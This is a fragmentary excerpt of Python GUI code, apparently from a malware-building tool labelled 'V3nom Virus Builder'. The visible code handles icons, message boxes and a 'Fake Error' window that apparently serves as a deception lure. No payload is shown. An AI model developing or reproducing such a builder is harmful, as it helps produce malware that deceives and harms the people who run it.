    ...
    def choose_icon():
        ...
        try:
            if sys.platform.startswith("win"):
                root = tk.Tk()
                root.iconbitmap('Img/V3nom_icon.ico')
                root.withdraw()
...
{BEFORE + current_time_hour() + AFTER} {INPUT} Builder:""")
    ...
    def error_logs(message):
        ...
        messagebox.showerror(f"V3nom {version_tool} | Virus Builder", message)

    def info_logs(message):
        messagebox.showinfo(f"V3nom {version_tool} | Virus Builder", message)
    ...
    def create_fake_error_window():
        ...
        fake_error_window.title(f"V3nom {version_tool} | Fake Error")

        if sys.platform.startswith("win"):
            fake_error_window.iconbitmap('Img/V3nom_icon.ico')
